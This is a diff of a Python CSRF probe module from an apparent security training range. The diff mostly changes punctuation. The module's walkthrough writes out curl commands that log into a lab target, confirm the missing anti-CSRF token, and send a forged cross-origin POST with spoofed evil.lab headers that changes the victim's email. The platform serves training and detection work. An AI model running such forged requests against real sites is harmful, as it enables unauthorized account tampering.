@@ -1,8 +1,8 @@
 """
-modules/csrf.py - APP-05: Cross-Site Request Forgery probe.
+modules/csrf.py — APP-05: Cross-Site Request Forgery probe.
 
 Target: POST /profile/update
-Vulnerability: No CSRF token required - any POST from any origin accepted.
+Vulnerability: No CSRF token required — any POST from any origin accepted.
 """
 from __future__ import annotations
 
@@ -25,7 +25,7 @@ class CSRFModule(BaseModule):
     category = Category.WEB
     scenario_id = "APP-05"
     severity = Severity.MEDIUM
-    # MITRE ATT&CK - abuse a valid session via a malicious link to forge a
+    # MITRE ATT&CK — abuse a valid session via a malicious link to forge a
     # state-changing request. (CSRF has no exact ATT&CK technique; mapped to the
     # closest user-execution + data-manipulation behaviours.)
     mitre = {
@@ -49,11 +49,11 @@ class CSRFModule(BaseModule):
             {"action": "Establish a victim session (abuse a valid account).",
              "technique": "T1078 Valid Accounts",
              "command": "curl -s -c jar.txt -d 'username=guest&password=guest' http://target-agent/auth/login -o /dev/null",
-             "expected": "A session cookie is stored in jar.txt - you are 'the logged-in victim'."},
-            {"action": "Recon the update form - confirm there is NO anti-CSRF token.",
+             "expected": "A session cookie is stored in jar.txt — you are 'the logged-in victim'."},
+            {"action": "Recon the update form — confirm there is NO anti-CSRF token.",
              "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
              "command": "curl -s -b jar.txt http://target-agent/profile/ | grep -i csrf || echo 'no csrf token field'",
-             "expected": "The form has no hidden _csrf_token field - it is forgeable."},
+             "expected": "The form has no hidden _csrf_token field — it is forgeable."},
             {"action": "Forge a cross-origin state-changing POST (the lure click).",
              "technique": "T1204.001 User Execution: Malicious Link",
              "command": "curl -s -b jar.txt -H 'Origin: http://evil.lab' -H 'Referer: http://evil.lab/evil/csrf-demo' -d 'email=hacked@evil.lab' http://target-agent/profile/update | grep -i updated",
@@ -61,7 +61,7 @@ class CSRFModule(BaseModule):
             {"action": "Verify the victim's data was changed (impact).",
              "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
              "command": "curl -s -b jar.txt http://target-agent/profile/ | grep hacked@evil.lab",
-             "expected": "The profile now shows the attacker's email - CSRF impact confirmed."},
+             "expected": "The profile now shows the attacker's email — CSRF impact confirmed."},
             {"action": "Click Check Progress in ATTENSE to review the evidence.",
              "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
              "command": "# review the activity log / Wazuh feed in ATTENSE",
@@ -70,7 +70,7 @@ class CSRFModule(BaseModule):
         "detection_rule": "Wazuh CSRF/mismatched-origin signature on /profile/update",
         "success_markers": [
             "'Profile updated' in the POST response",
-            "PASS STATE CHANGED log lines",
+            "✓ STATE CHANGED log lines",
             "csrf_lure_visited evidence",
             "csrf_lure_submitted evidence",
             "profile_changed_without_csrf evidence",
@@ -116,15 +116,15 @@ class CSRFModule(BaseModule):
             timeout=target.timeout,
         )
         steps.append(r_login)
-        self._log(log_fn, f" Login: HTTP {r_login.status_code}")
+        self._log(log_fn, f"  Login: HTTP {r_login.status_code}")
 
         # Step 2: Forged POST with no CSRF token and a spoofed cross-origin
-        # Origin/Referer - exactly what the attacker lure page would send.
+        # Origin/Referer — exactly what the attacker lure page would send.
         # Headers are applied *to the request itself* (T1204.001 lure click).
-        self._log(log_fn, f"Sending CSRF payload (email -> {new_email})...")
+        self._log(log_fn, f"Sending CSRF payload (email → {new_email})...")
         forged_emails = [new_email, "exfil@attacker.lab"]
         forged_headers = {
-            "Origin": "http://evil.lab.local",
+            "Origin":  "http://evil.lab.local",
             "Referer": target.base_url + "/evil/csrf-demo",
         }
 
@@ -144,9 +144,9 @@ class CSRFModule(BaseModule):
             )
             if changed:
                 r.evidence = f"STATE CHANGED: email set to {email}"
-                self._log(log_fn, f" PASS STATE CHANGED -> {email}")
+                self._log(log_fn, f"  ✓ STATE CHANGED  → {email}")
             else:
-                self._log(log_fn, f" - no change detected -> {email}")
+                self._log(log_fn, f"  – no change detected  → {email}")
 
             steps.append(r)
 
